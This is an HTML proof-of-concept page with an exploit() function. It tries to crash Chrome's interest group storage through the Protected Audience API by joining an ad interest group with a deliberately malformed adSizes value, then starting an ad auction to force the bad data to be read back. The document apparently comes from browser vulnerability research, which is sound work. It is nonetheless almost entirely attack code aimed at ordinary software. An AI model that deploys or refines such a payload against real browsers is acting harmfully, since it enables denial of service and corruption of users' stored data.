<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Trigger null deref in interest_group_storage</title>
</head>
<body>
<script>
async function exploit() {
  try {
    // Coba inject interest group dengan ad_sizes korup
    const interestGroup = {
      name: "corrupt_group_" + Date.now(),
      owner: "https://lanaya113505.github.io",
      biddingLogicUrl: "https://lanaya113505.github.io/pizza/decision-logic.js",
      ads: [{
        renderUrl: "https://lanaya113505.github.io/pizza/ad.html",
        // Ini HARUS objek, tapi kita coba string → HARAPAN: lolos ke DB
        adSizes: "CORRUPT_STRING_NOT_DICT"  // ⚠️ ini tidak valid
      }]
    };

    console.log("Joining corrupted interest group...");
    await navigator.joinAdInterestGroup(interestGroup, 30 * 24 * 60 * 60 * 1000); // 30 days
    console.log("Joined. Now trigger read...");

    // Sekarang, picu pembacaan ulang interest group
    const groups = await navigator.runAdAuction({
      seller: "https://lanaya113505.github.io",
      decisionLogicUrl: "https://lanaya113505.github.io/pizza/decision-logic.js",
      interestGroupBuyers: ["https://lanaya113505.github.io"]
    });

    console.log("Auction result:", groups);
  } catch (e) {
    console.warn("Join/auction failed (expected):", e.message);
    // Jika gagal di validation, berarti tidak bisa dipicu dari JS
  }
}

exploit();
</script>
</body>
</html>
